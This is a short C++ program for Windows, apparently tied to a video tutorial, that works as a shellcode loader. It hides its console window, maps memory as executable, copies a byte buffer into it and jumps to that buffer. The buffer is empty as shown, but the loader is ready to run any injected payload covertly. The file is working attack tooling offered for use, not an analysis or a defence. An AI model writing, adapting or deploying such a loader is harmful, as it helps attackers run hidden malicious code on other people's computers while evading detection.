//Video URL: https://youtu.be/WYf_nPIPC4s
#include <Windows.h>
#include <iostream>

unsigned char buf[] = "";

int main()
{
	ShowWindow(GetConsoleWindow(), SW_HIDE);

	HANDLE mem_handle = CreateFileMappingA(INVALID_HANDLE_VALUE, NULL, PAGE_EXECUTE_READWRITE, 0, sizeof(buf), NULL);

	void* mem_map = MapViewOfFile(mem_handle, FILE_MAP_ALL_ACCESS | FILE_MAP_EXECUTE, 0x0, 0x0, sizeof(buf));

	std::memcpy(mem_map, buf, sizeof(buf));

	std::cout << ((int(*)())mem_map)() << std::endl;
}
